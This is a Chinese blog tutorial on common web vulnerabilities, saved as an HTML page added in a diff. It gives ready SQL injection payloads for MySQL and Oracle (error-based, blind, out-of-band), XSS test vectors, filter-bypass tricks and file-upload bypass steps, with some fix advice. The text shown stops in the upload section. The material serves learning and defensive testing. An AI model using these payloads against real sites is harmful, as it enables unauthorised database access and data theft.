@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="theme-color" content="#3b3e43"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no"/><title>Web常见漏洞 - General 的个人博客</title><meta name="description" content="杨贺龙的博客系统。"/><meta property="og:description" content="杨贺龙的博客系统。"/>    <meta name="keywords" content="Solo,Java, 安全,测试博客,开源,Linux,CentOS,Ubuntu,Docker,Spring Boot,Swagger,SQLMAP,Web渗透"/><link rel="dns-prefetch" href="https://ZZUGeneral.github.io"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://ZZUGeneral.github.io"><link rel="icon" type="image/png" href="https://static.b3log.org/images/brand/solo-128.png"/><link rel="apple-touch-icon" href="https://static.b3log.org/images/brand/solo-128.png"><link rel="shortcut icon" type="image/x-icon" href="https://static.b3log.org/images/brand/solo-128.png"><meta name="copyright" content="B3log"/><meta http-equiv="Window-target" content="_top"/><meta property="og:locale" content="zh_CN"/><meta property="og:title" content="Web常见漏洞 - General 的个人博客"/><meta property="og:site_name" content="General 的个人博客"/><meta property="og:url"      content="https://ZZUGeneral.github.io/articles/2020/10/12/1602511210520.html?"/><meta property="og:image" content="https://static.b3log.org/images/brand/solo-128.png"/><link rel="search" type="application/opensearchdescription+xml" title="Web常见漏洞 - General 的个人博客" href="/opensearch.xml"><link href="https://ZZUGeneral.github.io/rss.xml" title="RSS" type="application/rss+xml" rel="alternate"/><link rel="manifest" href="https://ZZUGeneral.github.io/manifest.json">        <link rel="canonical" href="https://ZZUGeneral.github.io/articles/2020/10/12/1602511210520.html">        <link rel="stylesheet"
+              href="https://ZZUGeneral.github.io/skins/Bubble/css/base.css?1602754508835"/>
+            <link rel="prev" title="Web渗透之信息搜集" href="https://ZZUGeneral.github.io/articles/2020/10/12/1602510666141.html">
+            <link rel="next" title="Web应用程序安全" href="https://ZZUGeneral.github.io/articles/2020/10/13/1602577132460.html">
+    <script src="https://cdn.jsdelivr.net/npm/vditor@3.5.3/dist/js/icons/ant.js" async="" id="vditorIconScript"></script></head>
+<body class="fn__flex-column">
+<div id="pjax" class="fn__flex-1">
+    
+    <progress class="fn__progress"></progress>
+    <header class="header header--article">
+        <div class="wrapper header__title">
+            <h1 class="header__h1 fn__flex-inline">
+                <a href="https://ZZUGeneral.github.io" rel="start">General 的个人博客</a>
+            </h1>
+            <h2 class="header__desc header__desc--title">你一定会喜欢那个因为喜欢她而发光的自己！</h2>
+            <div class="header__desc">
+                <h2>人间忽晚，山河已秋。</h2>
+<!-- 公告栏可使用 HTML、JavaScript，比如可以在此加入第三方统计 js -->
+            </div>
+            <svg class="header__down" id="headerDown" viewBox="0 0 32 32" width="100%" height="100%">
+                <path d="M15.992 25.304c-0 0-0 0-0.001 0-0.516 0-0.981-0.216-1.31-0.563l-0.001-0.001-14.187-14.996c-0.306-0.323-0.494-0.76-0.494-1.241 0-0.998 0.809-1.807 1.807-1.807 0.517 0 0.983 0.217 1.313 0.565l0.001 0.001 12.875 13.612 12.886-13.612c0.331-0.348 0.797-0.565 1.314-0.565 0.481 0 0.918 0.187 1.242 0.493l-0.001-0.001c0.723 0.687 0.755 1.832 0.072 2.555l-14.201 14.996c-0.33 0.348-0.795 0.564-1.311 0.564-0.001 0-0.003 0-0.004 0h0z"></path>
+            </svg>
+        </div>
+    </header>
+    <div class="side__menu">
+        <svg viewBox="0 0 32 32" width="100%" height="100%">
+            <path d="M30 18h-28c-1.1 0-2-0.9-2-2s0.9-2 2-2h28c1.1 0 2 0.9 2 2s-0.9 2-2 2zM30 6.25h-28c-1.1 0-2-0.9-2-2s0.9-2 2-2h28c1.1 0 2 0.9 2 2s-0.9 2-2 2zM2 25.75h28c1.1 0 2 0.9 2 2s-0.9 2-2 2h-28c-1.1 0-2-0.9-2-2s0.9-2 2-2z"></path>
+        </svg>
+        <span>
+            &nbsp; menu
+        </span>
+    </div>
+    <div class="side__main">
+        <div class="side__bg"></div>
+        <div class="side__panel">
+            <svg class="side__close ft__a" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20"
+                 viewBox="0 0 20 20">
+                <path d="M18.362 19.324c-0.902 0.902-2.363 0.902-3.263 0l-5.098-5.827-5.098 5.825c-0.902 0.902-2.363 0.902-3.263 0-0.902-0.902-0.902-2.363 0-3.263l5.304-6.057-5.306-6.061c-0.902-0.902-0.902-2.361 0-3.263s2.361-0.902 3.263 0l5.1 5.829 5.098-5.829c0.902-0.902 2.361-0.902 3.263 0s0.902 2.363 0 3.263l-5.304 6.061 5.304 6.057c0.902 0.902 0.902 2.363 0 3.265z"></path>
+            </svg>
+
+            <div class="side__header">
+                <a href="https://ZZUGeneral.github.io" rel="start"><img class="side__logo" alt="General 的个人博客" src="https://b3logfile.com/avatar/1596873896447_1600698145202.jpeg?imageView2/1/w/128/h/128/interlace/0/q/100"></a>
+
+                <div class="side__meta">
+                    33 文章 <br>
+                    <span data-uvstaturl="https://ZZUGeneral.github.io">0</span> 浏览
+                    
+                </div>
+            </div>
+
+            <div class="side__title">
+                <span>ღゝ◡╹)ノ❤️</span>
+            </div>
+            <ul class="side__nav">
+                <li>
+                    <a href="https://ZZUGeneral.github.io" rel="start">
+                            General 的个人博客
+                    </a>
+                </li>
+                    <li>
+                        <a href="/my-github-repos" target="_self"><img
+                                class="page-icon" src="/images/github-icon.png" alt="我的开源">我的开源</a>
+                    </li>
+                <li>
+                    <a href="https://ZZUGeneral.github.io/categories.html">分类</a>
+                </li>
+                <li>
+                    <a href="https://ZZUGeneral.github.io/tags.html">标签墙</a>
+                </li>
+                <li>
+                    <a href="https://ZZUGeneral.github.io/archives.html">存档</a>
+                </li>
+                <li>
+                    <a href="https://ZZUGeneral.github.io/links.html">友链</a>
+                </li>
+                <li>
+                    <a rel="alternate" href="https://ZZUGeneral.github.io/rss.xml">RSS</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="article__top" style="background-image: url(file://I:/md/img/WEB%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image-20200903092803771.png?lastModify=1602511117?imageView2/1/w/1280/h/720/interlace/1/q/100)">
+        <div style="background-image: url(file://I:/md/img/WEB%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image-20200903092803771.png?lastModify=1602511117?imageView2/1/w/1280/h/720/interlace/1/q/100)"></div>
+        <canvas id="articleTop"></canvas>
+    </div>
+    <div class="article">
+        <div class="ft__center">
+            <div class="article__meta">
+                <time>
+                    2020-10-13
+                </time>
+                /
+                    <a rel="tag"
+                       href="https://ZZUGeneral.github.io/tags/Web%E6%B8%97%E9%80%8F">Web渗透</a> &nbsp;
+                    <a rel="tag"
+                       href="https://ZZUGeneral.github.io/tags/%E5%AE%89%E5%85%A8">安全</a> &nbsp;
+            </div>
+            <h2 class="article__title">
+                Web常见漏洞
+            </h2>
+<div class="article__share"
+     data-title="Web常见漏洞"
+     data-blogtitle="General 的个人博客"
+     data-url="https://ZZUGeneral.github.io/articles/2020/10/12/1602511210520.html"
+     data-avatar="https://b3logfile.com/avatar/1596873896447_1600698145202.jpeg?imageView2/1/w/128/h/128/interlace/0/q/100">
+    <span class="item" data-type="qqz">
+        <svg viewBox="0 0 32 32" width="100%" height="100%">
+            <path d="M22.824 13.989l-8.348 6.287s3.351 0.522 8.404 0.461l-0.23-1.040 7.2-6.549c0.132-0.12 0.183-0.312 0.129-0.487s-0.203-0.299-0.377-0.314l-9.492-0.856-3.708-9.213c-0.068-0.169-0.226-0.279-0.401-0.279s-0.333 0.11-0.401 0.279l-3.708 9.213-9.492 0.856c-0.174 0.015-0.323 0.139-0.377 0.314s-0.004 0.366 0.129 0.487l7.2 6.549-2.158 9.742c-0.040 0.178 0.026 0.365 0.168 0.474 0.142 0.107 0.331 0.115 0.481 0.021l8.158-5.165 8.158 5.165c0.070 0.045 0.147 0.066 0.225 0.066 0.090 0 0.18-0.029 0.256-0.086 0.142-0.109 0.208-0.295 0.168-0.474l-1.707-7.704c0.732-0.386 1.538-1.040 1.538-1.040s-3.195 1.638-14.664 0.838l8.312-6.325s-0.327-0.534-10.744-0.914c-0.697-0.026 8.493-1.83 15.281-0.305z"></path>
+        </svg>
+    </span>
+    <span class="item" data-type="wechat">
+        <svg viewBox="0 0 32 32" width="100%" height="100%">
+            <path d="M9.062 9.203c0-0.859-0.562-1.422-1.422-1.422-0.844 0-1.703 0.562-1.703 1.422 0 0.844 0.859 1.406 1.703 1.406 0.859 0 1.422-0.562 1.422-1.406zM20.672 17.125c0-0.562-0.562-1.125-1.422-1.125-0.562 0-1.125 0.562-1.125 1.125 0 0.578 0.562 1.141 1.125 1.141 0.859 0 1.422-0.562 1.422-1.141zM16.984 9.203c0-0.859-0.562-1.422-1.406-1.422-0.859 0-1.703 0.562-1.703 1.422 0 0.844 0.844 1.406 1.703 1.406 0.844 0 1.406-0.562 1.406-1.406zM26.906 17.125c0-0.562-0.578-1.125-1.422-1.125-0.562 0-1.125 0.562-1.125 1.125 0 0.578 0.562 1.141 1.125 1.141 0.844 0 1.422-0.562 1.422-1.141zM22.75 10.922c-0.359-0.047-0.719-0.063-1.094-0.063-5.375 0-9.625 4.016-9.625 8.953 0 0.828 0.125 1.625 0.359 2.375-0.359 0.031-0.703 0.047-1.063 0.047-1.422 0-2.547-0.281-3.969-0.562l-3.953 1.984 1.125-3.406c-2.828-1.984-4.531-4.547-4.531-7.656 0-5.391 5.094-9.625 11.328-9.625 5.563 0 10.453 3.391 11.422 7.953zM32 19.687c0 2.547-1.688 4.813-3.969 6.516l0.859 2.828-3.109-1.703c-1.141 0.281-2.281 0.578-3.406 0.578-5.391 0-9.625-3.688-9.625-8.219s4.234-8.219 9.625-8.219c5.094 0 9.625 3.688 9.625 8.219z"></path>
+        </svg>
+    </span>
+    <span class="item" data-type="weibo">
+        <svg viewBox="0 0 32 32" width="100%" height="100%">
+            <path d="M13.444 27.064c-5.3 0.525-9.875-1.875-10.219-5.35-0.344-3.481 3.675-6.719 8.969-7.244 5.3-0.525 9.875 1.875 10.212 5.35 0.35 3.481-3.669 6.725-8.963 7.244zM24.038 15.521c-0.45-0.137-0.762-0.225-0.525-0.819 0.512-1.287 0.563-2.394 0.006-3.188-1.038-1.481-3.881-1.406-7.137-0.037 0 0-1.025 0.444-0.762-0.363 0.5-1.613 0.425-2.956-0.356-3.737-1.769-1.769-6.469 0.069-10.5 4.1-3.013 3.006-4.763 6.212-4.763 8.981 0 5.287 6.787 8.506 13.425 8.506 8.7 0 14.494-5.056 14.494-9.069 0-2.431-2.044-3.806-3.881-4.375z"></path>
+            <path d="M29.819 5.833c-2.1-2.331-5.2-3.219-8.063-2.612v0c-0.663 0.144-1.081 0.794-0.938 1.45 0.144 0.662 0.788 1.081 1.45 0.938 2.038-0.431 4.238 0.2 5.731 1.856s1.9 3.913 1.256 5.888v0c-0.206 0.644 0.144 1.331 0.788 1.544 0.644 0.206 1.331-0.144 1.544-0.787v-0.006c0.9-2.762 0.331-5.938-1.769-8.269z"></path>
+            <path d="M26.588 8.752c-1.025-1.138-2.538-1.569-3.925-1.269-0.569 0.119-0.931 0.688-0.813 1.256 0.125 0.569 0.688 0.931 1.25 0.806v0c0.681-0.144 1.419 0.069 1.919 0.619 0.5 0.556 0.637 1.313 0.419 1.975v0c-0.175 0.55 0.125 1.15 0.681 1.331 0.556 0.175 1.15-0.125 1.331-0.681 0.438-1.356 0.163-2.906-0.863-4.037z"></path>
+            <path d="M13.738 20.771c-0.188 0.319-0.594 0.469-0.912 0.337-0.319-0.125-0.412-0.488-0.231-0.794 0.188-0.306 0.581-0.456 0.894-0.337 0.313 0.113 0.425 0.469 0.25 0.794zM12.044 22.933c-0.512 0.819-1.613 1.175-2.438 0.8-0.813-0.369-1.056-1.319-0.544-2.119 0.506-0.794 1.569-1.15 2.388-0.806 0.831 0.356 1.1 1.3 0.594 2.125zM13.969 17.146c-2.519-0.656-5.369 0.6-6.463 2.819-1.119 2.262-0.037 4.781 2.506 5.606 2.638 0.85 5.75-0.456 6.831-2.894 1.069-2.394-0.262-4.85-2.875-5.531z"></path>
+        </svg>
+    </span>
+    <span class="item" data-type="twitter">
+        <svg viewBox="0 0 32 32" width="100%" height="100%">
+            <path d="M32.003 6.075c-1.175 0.525-2.444 0.875-3.769 1.031 1.356-0.813 2.394-2.1 2.887-3.631-1.269 0.75-2.675 1.3-4.169 1.594-1.2-1.275-2.906-2.069-4.794-2.069-3.625 0-6.563 2.938-6.563 6.563 0 0.512 0.056 1.012 0.169 1.494-5.456-0.275-10.294-2.888-13.531-6.862-0.563 0.969-0.887 2.1-0.887 3.3 0 2.275 1.156 4.287 2.919 5.463-1.075-0.031-2.087-0.331-2.975-0.819 0 0.025 0 0.056 0 0.081 0 3.181 2.263 5.838 5.269 6.437-0.55 0.15-1.131 0.231-1.731 0.231-0.425 0-0.831-0.044-1.237-0.119 0.838 2.606 3.263 4.506 6.131 4.563-2.25 1.762-5.075 2.813-8.156 2.813-0.531 0-1.050-0.031-1.569-0.094 2.913 1.869 6.362 2.95 10.069 2.95 12.075 0 18.681-10.006 18.681-18.681 0-0.287-0.006-0.569-0.019-0.85 1.281-0.919 2.394-2.075 3.275-3.394z"></path>
+        </svg>
+    </span>
+    <span class="item__qr"></span>
+</div>        </div>
+        <div class="wrapper">
+            <section class="vditor-reset articles article__content">
+                <h1 id="SQL注入">SQL 注入</h1>
+<p>  SQL 注入即是指 Web 应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在 Web 应用程序中事先定义好的查询语句的结尾上添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<h2 id="SQL语句">SQL 语句</h2>
+<h2 id="SQL注入基础">SQL 注入基础</h2>
+<h3 id="SQL注入原理">SQL 注入原理</h3>
+<ul>
+<li>参数用户可控：前端传给后台的参数内容是用户可控制的</li>
+<li>参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询</li>
+</ul>
+<h3 id="相关知识点">相关知识点</h3>
+<p>  information_schema 库中：</p>
+<ul>
+<li>SCHEMATA 表存储该用户创建的所有数据库的库名，需要记住 SCHEMA_NAME 字段</li>
+<li>TABLES 表存储该用户创建的所有数据库的库名和表名，需要记住 TABLE_SCHEMA 和 TABLE_NAME 字段</li>
+<li>COLUMNS 表存储改用创建的所有数据库的库名，表名和字段名。需要记住 TABLE_SCHEMA,TABLE_NAME 和 COLUMNS_NAME</li>
+</ul>
+<h3 id="函数">函数</h3>
+<ul>
+<li>database() : 当前网站使用的数据库</li>
+<li>version() : 当前 MySQL 的版本</li>
+<li>user() : 当前 MySQL 的用户</li>
+</ul>
+<h3 id="注释符">注释符</h3>
+<p>  常见注释符： # 或--空格或/**/</p>
+<h3 id="内联注释">内联注释</h3>
+<p>  内联注释样式：/*! code */</p>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">index.php?id=-15/*!UNION*//*!SELECT*/ 1,2,3
+</code></pre>
+<h3 id="UNION注入">UNION 注入</h3>
+<ul>
+<li>使用 order by 判断返回字段数量</li>
+<li>输入错误的数据拼接想要的数据</li>
+</ul>
+<h3 id="BOOLEAN注入">BOOLEAN 注入</h3>
+<ul>
+<li>getlength(databse())&gt;=1(后面有单引号需要注释)判断库名长度</li>
+<li>substr(database(),1,1)='t' 判断库名组成字母</li>
+</ul>
+<h3 id="报错注入">报错注入</h3>
+<pre><code class="highlight-chroma">1‘ and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+
+
+updatexml(XML_document, XPath_string, new_value);
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XML_document</td>
+<td>String 格式，为 XML 文档对象的名称，文中为 Doc</td>
+</tr>
+<tr>
+<td>XPath_string</td>
+<td>Xpath 格式的字符串</td>
+</tr>
+<tr>
+<td>new_value</td>
+<td>String 格式，替换查找到的符合条件的数据</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><code>concat()</code> 函数是将其连成一个字符串，因此不会符合 <strong>XPATH_string</strong> 的格式，从而出现格式错误，爆出用户</li>
+<li><code>0x7e</code> ASCII 码，实为 <code>~</code>,**upadtexml()**报错信息为特殊字符、字母及之后的内容，为了前面字母丢失，开头连接一个特殊字符 <code>~</code></li>
+</ul>
+<h2 id="SQL注入进阶">SQL 注入进阶</h2>
+<h3 id="时间注入">时间注入</h3>
+<p>  if(expr1,expr2，expr3)：如果 expr1 是 TRUE，则返回 expr2，否则返回 expr3</p>
+<pre><code class="highlight-chroma">if(length(database())&gt;1,sleep(5),1)
+</code></pre>
+<p>  根据响应时间判断条件是否正确</p>
+<h3 id="堆叠查询注入">堆叠查询注入</h3>
+<p>  使用 ；将 SQL 语句分为两套执行</p>
+<h3 id="二次注入">二次注入</h3>
+<p>  存储数据时如字段 username=test'没有 SQL 注入漏洞，但是在查询该字段时没有进行转义，所以变为 username=’test''报错。</p>
+<h3 id="宽字节注入">宽字节注入</h3>
+<pre><code class="highlight-chroma">select * from user where id = '1\'' limit 0，1
+</code></pre>
+<p>  传入的单引号被转义，导致参数 ID 无法逃逸单引号包围。所以一般情况下，此处不存在 SQL 注入漏洞，但是又一种特殊情况。当数据库编码为 GBK 是，可以使用宽字节注入。</p>
+<p>  宽字节的格式是在地址偶棉先加一个 %df，再加单引号。因为反斜杠的编码为 %5c，而在 GBK 编码中， %df%5c 是繁体字 “連”，所以此时，单引号成功逃逸，报出 MySQL 数据库的错误。输入：id=1%df'%23</p>
+<pre><code class="highlight-chroma">select * from user where id = '1連' #' limit 0,1
+</code></pre>
+<p>  在 PHP 中，通过 iconv()进行编码转换时，也可能存在宽字节注入漏洞。</p>
+<p>  宽字节注入：<a href="https://blog.csdn.net/u011721501/article/details/42874517" target="_blank">https://blog.csdn.net/u011721501/article/details/42874517</a></p>
+<h3 id="cookie注入">cookie 注入</h3>
+<p>  将参数通过 cookie 进行设置，然后在 cookie 注入界面通过 $_COOKIE 获取参数 ID，然后直接将参数拼接到 select 语句中进行查询。</p>
+<h3 id="Base64注入">Base64 注入</h3>
+<p>  程序获取 GET 参数 ID，利用 base64_decode 对参数 ID 进行 base64 解码，然后直接将解码后的数据拼接到 select 语句中进行查询。但是由于没有对解码后的数据进行过滤，且将参数直接拼接到 SQL 中，所以存在了注入漏洞。</p>
+<h3 id="XFF注入">XFF 注入</h3>
+<p>  X-Forwarded-For 简称 XFF 头，代表客户端真实 IP。</p>
+<p>  PHP 的 getenv()函数用于获取一个环境变量的值，如果环境变量不存在返回 False。</p>
+<p>  程序的参数是用户 IP，可以通过修改 HTTP 头部信息 CLIENT_IP 或 X_FORWARDED_FOR 进行注入。</p>
+<h2 id="Oracle注入">Oracle 注入</h2>
+<p>  注入规则：</p>
+<ul>
+<li>Oracle 使用查询语句获取数据时需要跟上表名，没有标的情况下可以使用 dual，dual 是 Oracle 的虚拟表，用来构成 select 的语法规则，Oracle 保证 dual 里面永远只有一条数据</li>
+<li>Oracle 的数据类型是强匹配的（MySQL 有弱匹配的味道），所以在 Oracle 进行类似 UNION 查询数据时必须让对应位置上对的数据类型和表中的列的数据类型是一致的，也可以使用 null 代替某些无法快速猜出数据类型的位置</li>
+<li>Oracle 的单行注释符是 -- ，多行注释符号 /**/</li>
+</ul>
+<h3 id="注入实例语句">注入实例语句</h3>
+<pre><code class="highlight-chroma">判断列数： ‘ order by 3 --
+判断回显位置： ' union select null,null,null from dual --
+获取数据库版本信息： ' union select null, (select banner from sys.v_$version where rownum=1),null from dual --
+获取数据库表名： ‘ union select null,(select table_name from user_tables where rownum=1),null from dual --
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  ‘ union select null,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;'T_USER'),null from dual --
+获取关键表中的列名： ' union select null,(select column_name from user_tab_columns where table_name='T_USER' and rownum=1),null from dual --
+</code></pre>
+<h3 id="盲注">盲注</h3>
+<h4 id="报错盲注">报错盲注</h4>
+<pre><code class="highlight-chroma">参数不匹配的报错
+id ==1' and 1=utl_inaddr.get_host_name((select user from dual)) --
+1' and 1=ctxsys.drithsx.sn(1,select user from dual) --
+1‘ and (select upper(XML_TYPE(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --
+1' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null --
+1' and (select dbms_xdb_version.makeversioned(select user from dual()) from dual) is not null --
+1' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null
+1' and (select dbms_utility_sqlid_to_sqlhash((select user from dual)) from dual) is not null --
+1' and 1= ordsys.ord_dicom.getmappingxpath((select user from dual),user,user) --
+1' and 1= ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) --
+</code></pre>
+<h4 id="时间盲注">时间盲注</h4>
+<pre><code class="highlight-chroma">1‘ and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10) and '1'='1')
+1' and 1=(selecct decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) and '1'='1
+1' and 1=(selecct decode(substr(user,1,1),'S',DBMS_PIPE.RECEIVE_MESSAGE('a',10) ,0) from dual) and '1'='1
+</code></pre>
+<h4 id="外带通信">外带通信</h4>
+<ol>
+<li>Oracle 发送 HTTP 和 DNS 请求，并将查询结果带到请求中，然后检测外网服务器的 HTTP 和 DNS 日志，从日志中获取查询结果，通过这种方式将繁琐的忙住转换成可以直接简便的获取查询结果方式</li>
+<li>使用第三方平台，监听访问请求，并记录请求的日志信息，然后使用 url_http.request()向外网主机发送 http 请求，请求便携带了查询的结果信息。此处可以结合 SSRF 进行内网探测</li>
+<li>利用 url_inaddr.get_host_address()，将查询结果拼接到域名下，并使用 DNS 记录解析日志，通过这种方式获取查询结果</li>
+</ol>
+<p>  <img src="file://I:/md/img/WEB%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image-20200903092803771.png?lastModify=1602511117" alt="image-20200903092803771"></p>
+<h2 id="SQL注入绕过">SQL 注入绕过</h2>
+<ol>
+<li>
+<p>大小写绕过</p>
+</li>
+<li>
+<p>双写绕过</p>
+</li>
+<li>
+<p>编码绕过</p>
+<p>由于服务器会自动对 URL 进行一次 URL 解码，所以需要把关键词编码两次。注意：URL 编码选择全编码，而不是普通的 URL 编码。</p>
+<p>全编码是对所有的字符进行编码，普通的 URL 编码会有特殊字符无法编码，如：! @ # $ &amp; * ( ) = : / ; ? + '</p>
+<ol start="4">
+<li>内联注释绕过</li>
+</ol>
+</li>
+</ol>
+<h2 id="SQL注入修复建议1--过滤危险字符-如-采用正则表达式匹配union-sleep-load-file等关键字">SQL 注入修复建议 1. 过滤危险字符。如，采用正则表达式匹配 union,sleep,load_file 等关键字</h2>
+<ol start="2">
+<li>使用预编译语句。需要注意：不要将变量直接拼接到 PDFO 语句中，而是使用占位符进行数据库的增删改查</li>
+</ol>
+<h1 id="XSS">XSS</h1>
+<p>  跨站脚本（Cross-Site Scripting，简称 XSS）是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意客户将代码注入到网页，其他用户在浏览网页时就会受到影响。</p>
+<p>  XSS 攻击分为三类：</p>
+<ul>
+<li>反射性</li>
+<li>存储型</li>
+<li>DOM 型</li>
+</ul>
+<h2 id="原理">原理</h2>
+<ul>
+<li>反射性 XSS：攻击往往具有一次性。攻击者将包含 XSS 代码得到恶意链接发送给目标用户。目标用户点击链接时，服务器接收请求并处理，然后服务器将带有 XSS 代码的数据发送给目标用户浏览器，浏览器进行解析就会触发。</li>
+<li>存储型 XSS：攻击脚本将被永久地存储在目标服务器的数据库或者文件中，就有很高的隐蔽性。多见于论坛，博客和留言板。攻击者发帖时，将恶意脚本和正常信息一起注入帖子内容中，随着帖子被存储下来，其他用户浏览帖子时，恶意脚本就会在浏览器得到执行。</li>
+<li>DOM 型 XSS：基于 DOM 文档对象模型的一种漏洞。用户请求一个经过攻击者设计提交的 URl，服务的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM 对象就会处理 XSS 代码，导致存在 XSS 漏洞。</li>
+</ul>
+<h2 id="攻击分析">攻击分析</h2>
+<p>  反射性：</p>
+<pre><code class="highlight-chroma">“&gt;&lt;img src=1 onerror=alert(/xss/) /&gt;  通过"&gt;闭合上一个标签，然后添加另外的恶意标签
+</code></pre>
+<p>  存储型：</p>
+<pre><code class="highlight-chroma">&lt;img src=1 onerror=alert(/xss/) /&gt; &nbsp; &nbsp;  输入恶意代码
+</code></pre>
+<p>  DOM 型：</p>
+<pre><code class="highlight-chroma">&lt;img src=1 onerror=alert(/xss/) /&gt;
+点击提交按钮时，触发DOM操作函数导致触发XSS漏洞
+</code></pre>
+<h2 id="XSS进阶">XSS 进阶</h2>
+<h3 id="XSS常用语句和编码绕过">XSS 常用语句和编码绕过</h3>
+<p>  XSS 常用测试语句</p>
+<pre><code class="highlight-chroma">&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;img sec=x onerror=alert(1)&gt;
+
+&lt;svg onload=alert(1)&gt;
+
+&lt;a href=javascript:alert(1)&gt;
+</code></pre>
+<p>  JS 编码</p>
+<ul>
+<li>三个八进制数字，如果个数不够，在前面不 0，例如 "e" 的编码为 "\145"</li>
+<li>两个十六进制数字，如果个数不够，在前面不 0，例如 "e" 的编码为 "\x65"</li>
+<li>四个十六进制数字，如果个数不够，在前面不 0，例如 "e" 的编码为 "\u0065"</li>
+<li>对于一些特殊字符，使用特殊的 C 类型的转义风格（例如\n 和\r）</li>
+</ul>
+<p>  HTML 实体编码</p>
+<p>  命名实体：以&amp;开头，以分号结尾。eg:</p>
+<pre><code class="highlight-chroma"> "&lt;" --&gt;  "&lt;"
+</code></pre>
+<p>  字符编码：十进制，十六进制 ASCII 或者 Unicode 字符编码，样式为"&amp;# 数值;".eg:</p>
+<pre><code class="highlight-chroma"> "&lt;"  ---&gt;  "&lt;" 和  "&lt;"
+</code></pre>
+<p>  URL 编码</p>
+<p>  这里的 URL 编码，也是两次 URL 全编码的结果。</p>
+<p>  在使用 XSS 编码测试时，需要考虑 HTML 渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。</p>
+<h2 id="修复建议">修复建议</h2>
+<ul>
+<li>过滤输入的数据，包括 " ' '"," " ", " &lt; ", " &gt; ", "on* "等非法字符</li>
+<li>对输出到界面的数据进行相应的编码转换，包括 HTML 实体编码，JS 编码等</li>
+</ul>
+<h1 id="CSRF">CSRF</h1>
+<p>  跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p>
+<h2 id="原理-">原理</h2>
+<p>  攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。</p>
+<p>  XSRF 攻击过程重点：</p>
+<ul>
+<li>目标用户已经登陆了网站，能够执行网站的功能</li>
+<li>目标用户和访问了攻击者构造的 URL</li>
+</ul>
+<h2 id="修复建议-">修复建议</h2>
+<ul>
+<li>验证请求的 Referer 值</li>
+<li>在请求中放入攻击者不能伪造的信息，例如随机的 token</li>
+</ul>
+<h1 id="SSRF">SSRF</h1>
+<p>  SRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是外网无法访问的内部系统。（因为请求是由服务端的发起的，所有服务端能请求到与自身相连而与外网隔离的内部系统）。</p>
+<h2 id="原理--">原理</h2>
+<p>  SSRF 的形成多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址进行过滤和限制。</p>
+<p>  攻击方式：</p>
+<ul>
+<li>对外网，服务器所在内网。本地进行端口扫描，获取一些服务的 banner 信息</li>
+<li>攻击运行在内网或本地的应用程序</li>
+<li>对内网进行指纹识别，识别企业内部的资产信息</li>
+<li>攻击内外网的 Web 应用，主要是使用 HTTP GET 请求就可以实现的攻击</li>
+<li>利用 file 协议读取本地文件等</li>
+</ul>
+<h2 id="修复建议--">修复建议</h2>
+<ul>
+<li>限制请求的端口只能为 Web 端口，只允许访问 HTTP 和 HTTPS 的请求</li>
+<li>限制不能访问内网的 IP，以防止对内网进行攻击</li>
+<li>屏蔽返回的详细信息</li>
+</ul>
+<h1 id="文件上传">文件上传</h1>
+<p>  上传文件时，服务器端代码卫队客户端上传的文件进行严格的验证和过滤，导致可以上传任意文件的情况。</p>
+<h2 id="JS检测绕过攻击">JS 检测绕过攻击</h2>
+<ul>
+<li>使用浏览器插件，删除检测文件后缀的 JS 代码</li>
+<li>首先把需要上传的文件后缀改为允许上传的。如 jpg，png 等，绕过 js 的检测，再抓包，把后缀名改为可执行文件的后缀即可上传成功</li>
+</ul>
